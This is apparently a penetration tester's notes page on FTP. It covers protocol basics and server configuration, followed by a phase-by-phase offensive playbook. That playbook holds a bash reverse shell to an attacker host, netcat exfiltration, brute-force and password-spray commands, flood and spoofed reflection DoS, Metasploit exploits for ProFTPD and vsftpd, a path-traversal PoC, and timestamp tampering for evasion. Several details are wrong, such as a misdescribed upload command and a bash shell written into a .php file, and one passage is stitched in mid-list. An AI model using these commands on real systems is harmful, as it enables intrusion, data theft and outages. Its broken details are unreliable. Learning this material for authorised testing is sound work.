# Index
- [[Ports, Protocols, and Services]]

# File Transfer Protocol (FTP)

- **Port Number:** 21 (Control), 20 (Data)
- **Protocol:** TCP
- **Service Name:** File Transfer Protocol (FTP)
- **Defined in:** RFC 959

File Transfer Protocol (FTP) is a standard network protocol used for transferring files between a client and a server on a computer network. FTP is built on a client-server model architecture using separate control and data connections between the client and the server. The protocol is one of the oldest and was originally designed for the secure and efficient transfer of files over networks.

## Overview of Features

- **Separate Control and Data Channels:** FTP uses two ports for communication—port 21 for control commands and port 20 for data transfer.
  
- **Active and Passive Modes:** FTP can operate in two different modes, active and passive, to adapt to various network configurations, such as firewalls and NAT.

- **Authentication:** FTP supports authentication via usernames and passwords, although it transmits these credentials in plaintext by default, making it less secure without additional protection (e.g., FTPS or SFTP).

- **Directory Operations:** FTP supports various directory operations, such as listing files, changing directories, and creating/deleting files and directories.

- **Binary and ASCII Transfer Modes:** FTP can transfer files in either binary mode (for binary files like images, executables) or ASCII mode (for text files).

- **Resuming Transfers:** FTP supports the resumption of interrupted file transfers, which is particularly useful for large files.

## Typical Use Cases

- **Website Management:** Web developers often use FTP to upload and download files from a web server.

- **Data Migration:** FTP is frequently used to transfer large datasets between systems or backup servers.

- **File Sharing:** Organizations use FTP servers to allow clients or partners to upload and download files securely.

- **Automated File Transfers:** FTP is commonly employed in automated scripts for batch file transfers between systems.

## How FTP Protocol Works

1. **Connection Establishment:**
   - **Step 1:** The client initiates a connection to the FTP server on port 21.
   - **Step 2:** The server responds with a greeting message, indicating that the connection has been established.

2. **Authentication:**
   - **Step 3:** The client sends a `USER` command followed by the username.
   - **Step 4:** The server responds with a prompt for the password.
   - **Step 5:** The client sends a `PASS` command followed by the password.
   - **Step 6:** The server authenticates the user and grants access if the credentials are correct.

3. **Command and Control:**
   - **Step 7:** The client can now send various FTP commands (e.g., `LIST`, `RETR`, `STOR`) over the control connection to manage files on the server.
   - **Step 8:** The server processes these commands and sends back responses over the control channel.

4. **Data Transfer:**
   - **Active Mode:**
     - **Step 9:** The client sends a `PORT` command, specifying which port it will use for data transfer.
     - **Step 10:** The server initiates the connection to the client’s specified port from its own port 20.
   - **Passive Mode:**
     - **Step 11:** The client sends a `PASV` command, requesting the server to provide a port for data transfer.
     - **Step 12:** The server responds with an IP address and port number, which the client uses to initiate the data connection.
   - **Step 13:** File transfers are executed over this data connection, whether it is a file upload, download, or directory listing.

5. **Connection Termination:**
   - **Step 14:** After the necessary file operations, the client sends a `QUIT` command to the server.
   - **Step 15:** The server closes the control connection, terminating the session.

### Diagram (Hypothetical Example)

- **Client:** `<attack_ip>` connects to `<target_ip>`:21, authenticates, and initiates a file download.
- **Server:** `<target_ip>` listens on port 21 for control commands and port 20 (or another port in passive mode) for data transfer.

# Additional Information

## Security Considerations

- **Plaintext Transmission:** FTP transmits credentials and data in plaintext, making it vulnerable to interception by attackers. This can be mitigated using FTPS (FTP Secure) or SFTP (SSH File Transfer Protocol).

- **Firewall and NAT Compatibility:** FTP's dual-port operation can be problematic with firewalls and NAT devices. Passive mode is often preferred in such environments as it requires fewer inbound ports to be opened.

- **Anonymous FTP:** Some FTP servers allow anonymous login, where users do not need to provide credentials. This can be a security risk if not properly configured.

## Alternatives

- **FTPS (FTP Secure):** An extension to FTP that adds support for TLS (Transport Layer Security) and SSL (Secure Sockets Layer) encryption.
  
- **SFTP (SSH File Transfer Protocol):** Unlike FTP, SFTP runs over SSH and provides secure file transfer capabilities, including encryption and secure authentication.

- **WebDAV:** A web-based protocol that allows users to manage files on a remote server securely.

## Advanced Usage

- **Automated File Transfers:** Scripts using FTP clients like `lftp` or `curl` can automate file transfers, often employed in backup solutions or batch processing.

- **Large File Handling:** FTP supports the transfer of very large files, and with the proper configuration, it can handle file sizes exceeding 2GB.

## Modes of Operation

- **Active Mode:** In Active Mode, the client opens a dynamic port and waits for the server to connect back to it for data transfer. The process is as follows:
	- Client sends the `PORT` command with its IP address and dynamic port number.
	- Server establishes a data connection from its Port 20 to the specified client port.

- **Passive Mode:**In Passive Mode, the server opens a dynamic port and waits for the client to connect to it. The process is as follows:
	- Client sends the `PASV` command.
	- Server responds with its IP address and dynamic port number.
	- Client establishes a data connection to the specified server port. File Transfer Protocol (FTP) is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet. FTP is a client-server protocol, meaning that the user, or client, establishes a connection to the server and can then upload or download files. FTP uses two channels for communication, one for control and one for data transfer. The control channel is used for authentication and sending commands, while the data channel is used for the actual transfer of files. FTP is commonly used for transferring files over the internet and is supported by most operating systems and file transfer clients.

## Configuration Files

1. **vsftpd (Very Secure FTP Daemon):**
   - **File Location:** `/etc/vsftpd/vsftpd.conf`
   - **Configuration Example:**
     ```bash
     listen=YES
     anonymous_enable=NO
     local_enable=YES
     write_enable=YES
     chroot_local_user=YES
     ```
   - **Key Settings:**
     - `listen`: Determines whether vsftpd runs in standalone mode.
     - `anonymous_enable`: Controls whether anonymous users can log in.
     - `local_enable`: Allows local users to log in.
     - `write_enable`: Permits file uploads and deletions.
     - `chroot_local_user`: Enforces a chroot jail for local users, restricting them to their home directory.

2. **ProFTPD:**
   - **File Location:** `/etc/proftpd/proftpd.conf`
   - **Configuration Example:**
     ```bash
     ServerName "ProFTPD Default Installation"
     ServerType standalone
     DefaultServer on
     RequireValidShell off
     ```
   - **Key Settings:**
     - `ServerName`: Sets the name of the FTP server.
     - `ServerType`: Defines whether ProFTPD runs as a standalone server or via inetd.
     - `DefaultServer`: Indicates if this server is the default server.
     - `RequireValidShell`: Controls whether a valid shell is required for users to log in.

3. **Pure-FTPd:**
   - **File Location:** `/etc/pure-ftpd/pure-ftpd.conf`
   - **Configuration Example:**
     ```bash
     NoAnonymous yes
     ChrootEveryone yes
     ```
   - **Key Settings:**
     - `NoAnonymous`: Disables anonymous logins.
     - `ChrootEveryone`: Enforces chroot jail for all users.

## Potential Misconfigurations

1. **Anonymous Login Enabled:**
   - **Risk:** Allowing anonymous logins can expose sensitive files to unauthorized users.
   - **Exploitation:** Attackers can log in without credentials and access or upload malicious files.
   - **Fix:** Disable anonymous login by setting `anonymous_enable=NO` in vsftpd or the equivalent setting in other FTP servers.

2. **Weak or Default Credentials:**
   - **Risk:** Using weak or default credentials makes the FTP server susceptible to brute-force attacks.
   - **Exploitation:** Attackers can gain unauthorized access by guessing or using common credentials.
   - **Fix:** Enforce strong password policies and change default credentials immediately after installation.

3. **Misconfigured Permissions:**
   - **Risk:** Incorrectly set permissions may allow unauthorized file manipulation.
   - **Exploitation:** Users may gain unauthorized write or delete access, leading to potential data loss or compromise.
   - **Fix:** Carefully configure file permissions and use the `chroot_local_user` setting to restrict user access.

4. **Unsecured FTP Data Channels:**
   - **Risk:** Data transferred in plaintext can be intercepted by attackers.
   - **Exploitation:** Sensitive information, such as credentials or confidential files, can be captured.
   - **Fix:** Use FTPS or SFTP to secure data channels.

## Default Credentials

- **vsftpd:**
  - Default: No default login, requires user setup during installation.
  
- **ProFTPD:**
  - Default: No default login, typically configured with local system users.
  
- **Pure-FTPd:**
  - Default: No default login, setup typically requires explicit user creation.

# Interaction and Tools

## Tools

### [[FTP]]
- **FTP Connect:** Opens an FTP session with the target server.
    ```bash
     ftp <username>:<password>@<target_ip> <target_port>
    ```
- **Directory Navigation:** Changes the working directory on the FTP server.
	```bash
	cd <directory_name>
	```
- **Download File:** Downloads a file from the FTP server to the local machine.
	```bash
	get <file_name>
	```
- **Upload File:** Uploads a file from the FTP server to the local machine.
	```bash
	put <file_name>
	```
- **List Files:** Lists files in the current directory on the FTP server.
	```bash
	ls
	```
- **Passive Mode Enable:** Switches the FTP session to passive mode, useful in NAT or firewall environments.
	```bash
	quote PASV
	```
- **Binary Mode Enable:** Switches the FTP transfer mode to binary, ensuring that non-text files are transferred without modification.
	```bash
	binary
	```

### [[LFTP]]
- **FTP Client Connect:** Opens an FTP session with the target server.
    ```bash
    lftp -u <username>,<password> <target_ip>
    ```
- **Mirror a Directory:** Mirrors a local directory to a remote FTP server, synchronizing all changes.
    ```bash
    lftp -e "mirror --reverse --delete --verbose <local_dir> <remote_dir>; quit" -u <username>,<password> <target_ip>
    ```

### [[FileZilla]]

### [[WGet]]
- **Download File:** Automates file download from an FTP server using Wget, useful for scripting.
    ```bash
    wget ftp://<username>:<password>@<target_ip>/<file_path> -O <local_file>
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 21"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 21
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 21
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 21 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 21
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 21 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:21
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 21 -c 1
    ```

## Other Techniques

### Mount remote FTP locally
- **Description:** Mount FTP locally
	```bash
	sudo apt-get install curlftpfs
	mkdir /mnt/my_ftp
	curlftpfs ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/
	```

### Allow other users
- **Description:** Allow other user access to FTP.
	```bash
	curlftpfs -o allow_other ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/
	```

### GUI Connection with XDG
- **Description:** Establish GUI connection from Linux
    ```bash
    xdg-open ftp://<target_ip>/
    ```

### Browser Connection
- **Description:** Connect to a FTP server using a browser (like Firefox) using a URL.
    ```bash
    ftp://anonymous:anonymous@10.10.10.98
    ```
- **Use Case:** If a web application is sending data controlled by a user directly to a FTP server you can send double URL encode %0d%0a (in double URL encode this is %250d%250a) bytes and make the FTP server perform arbitrary actions. One of this possible arbitrary actions is to download content from a users controlled server, perform port scanning or try to talk to other plain-text based services (like http).

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 21
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 21
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Anonymous Login
- **Tool:** [[FTP]]
    ```bash
    ftp <target_ip> <target_port>
    >anonymous
    >anonymous
    ```
- **Description:** If anonymous login is enabled, attackers can log in without credentials and explore the file system, potentially finding sensitive information.

## Persistence

### Planting a Backdoor
- **Tool:** [[Custom Scripts]], [[FTP]]
    ```bash
    echo "bash -i >& /dev/tcp/<attack_ip>/4444 0>&1" > /path/to/webshell.php
    ```
- **Description:** Uploads a malicious web shell or backdoor script to maintain persistent access.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 21"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### FTP Credential Enumeration
- **Tool:** [[Metasploit]], [[Nmap]]
    ```bash
    use auxiliary/scanner/ftp/ftp_login
    set RHOSTS <target_ip>
    run
    ```
- **Description:** Automates the process of guessing FTP credentials to harvest valid logins.

## Privilege Escalation

### Anonymous FTP Writeable Directory Exploit
- **Tool:** Manual, [[Custom Scripts]]
    ```bash
    echo "bash -i >& /dev/tcp/<attack_ip>/4444 0>&1" > /path/to/webshell.php
    ```
- **Description:** Exploits write permissions in an anonymous FTP directory to upload and execute a malicious shell.

### Abusing Misconfigured FTP Permissions
- **Tool:** [[FTP]]
    ```bash
    ftp <target_ip>
    ```
- **Description:** Escalate privileges by exploiting misconfigured permissions, such as world-writable directories.

## Internal Reconnaissance

### Directory Traversal
- **Tool:** [[FTP]]
    ```bash
    ftp <target_ip>
    cd ../../
    ```
- **Description:** Exploits directory traversal vulnerabilities to access unauthorized areas of the server’s file system.

### Listing Sensitive Files
- **Tool:** [[FTP]]
    ```bash
    ls -la
    ```
- **Description:** Looks for sensitive files (e.g., backup files, config files) that may contain valuable information.

## Lateral Movement, Pivoting, and Tunnelling

### Using FTP for Lateral Movement
- **Tool:** [[FTP]], SSH Tunneling
    ```bash
    ftp <target_ip>
    ```
- **Description:** Move laterally across the network by using FTP to upload malicious scripts or tools to other accessible servers.

### FTP Tunneling
- **Tool:** [[SSH]], [[FTP]]
    ```bash
    ssh -L 2121:<target_ip>:21 <user>@<jump_host>
    ftp localhost 2121
    ```
- **Description:** Tunnels FTP traffic through an SSH tunnel to bypass network restrictions.

## Defense Evasion

### Steganography over FTP
- **Tool:** [[Custom Scripts]]
    ```bash
    steghide embed -cf image.jpg -ef secret.txt
    ```
- **Description:** Hides data within files (e.g., images) and uploads them to the FTP server, evading detection.

### File Timestamp Manipulation
- **Tool:** `touch` Command
    ```bash
    touch -t 202401010000 /path/to/file
    ```
- **Description:** Alters the timestamp of uploaded files to avoid detection by security teams looking for recent changes.

## Data Exfiltration

### Exfiltrating Data via FTP
- **Tool:** [[FTP]], Automated Scripts
    ```bash
    ftp <target_ip>
    mget *
    ```
- **Description:** Exfiltrates sensitive data from the server by downloading files over FTP.

### Automated Data Extraction
- **Tool:** [[WGet]], [[cURL]]
    ```bash
    wget ftp://<username>:<password>@<target_ip>/<sensitive_data_path>
    ```
- **Description:** Automates the process of extracting large datasets from the FTP server for exfiltration.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ftp://<target_ip> -s 21 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra ftp://<target_ip> -s 21 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

<br>

- **Tool:** [[Custom Scripts]]
    ```bash
    for pass in $(cat passwords.txt); do echo "USER $user" | nc <target_ip> 21; echo "PASS $pass" | nc <target_ip> 21; done
    ```
- **Description:** Automates the use of known credentials (from breaches) to attempt access to the target server.

### Offline Hash Cracking
- **Tool:** [[John the Ripper Cheat Sheet]]
    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

<br>

- **Tool:**
	```bash
	hashcat -m <mode> <hash_file> <path/to/wordlist>
	```
- **Description:** Cracks dumped password hashes to gain access.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### FTP Bounce Attack
- **Tool:** [[Custom Scripts]]
    ```bash
    telnet <target_ip> 21 PORT <attack_ip>,<attack_port>,<target_ip>,<target_port>
    ```
- **Description:** Exploits the FTP server’s ability to connect to other servers, using it to flood another target with traffic. Some FTP servers allow the command PORT. This command can be used to indicate to the server that you wants to connect to other FTP server at some port. Then, you can use this to scan which ports of a host are open through a FTP server. You could also abuse this behavior to make a FTP server interact with other protocols. You could upload a file containing an HTTP request and make the vulnerable FTP server send it to an arbitrary HTTP server (maybe to add a new admin user?) or even upload a FTP request and make the vulnerable FTP server download a file for a different FTP server.

## Exploits 

### ProFTPD Mod_copy Command Injection
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/unix/ftp/proftpd_modcopy_exec
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in ProFTPD’s mod_copy module, allowing arbitrary command execution.

### vsftpd 2.3.4 Backdoor Command Execution
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a backdoor in vsftpd 2.3.4, allowing for remote command execution.

### CVE-2022-22836
- **Tool:** Manual, [[Custom Scripts]]
    ```bash
    curl -k -X PUT -H "Host: <target_ip>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<target_ip>/../../../../../../whoops
    ```
- **Description:** This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access. This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept. The exploit for this attack is relatively straightforward, based on a single curl command.

### Filezilla Server Vulnerability
- **Tool:**
- **Description:** FileZilla usually binds to local an Administrative service for the FileZilla-Server (port 14147). If you can create a tunnel from your machine to access this port, you can connect to it using a blank password and create a new user for the FTP service.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 959|https://tools.ietf.org/html/rfc959|
|ProFTPD Documentation|http://www.proftpd.org/docs/|
|vsftpd Guide|https://security.appspot.com/vsftpd.html|
|Nmap FTP Scan|https://nmap.org/nsedoc/scripts/ftp-anon.html|
|FileZilla User Guide|https://filezilla-project.org/documentation.php|
|Hydra GitHub|https://github.com/vanhauser-thc/thc-hydra|
|Wireshark FTP Analysis|https://wiki.wireshark.org/FTP|
|SSH and SFTP|https://www.ssh.com/academy/ssh/sftp|
|Metasploit Framework|https://www.metasploit.com/|
|Linux man-pages|https://man7.org/linux/man-pages/|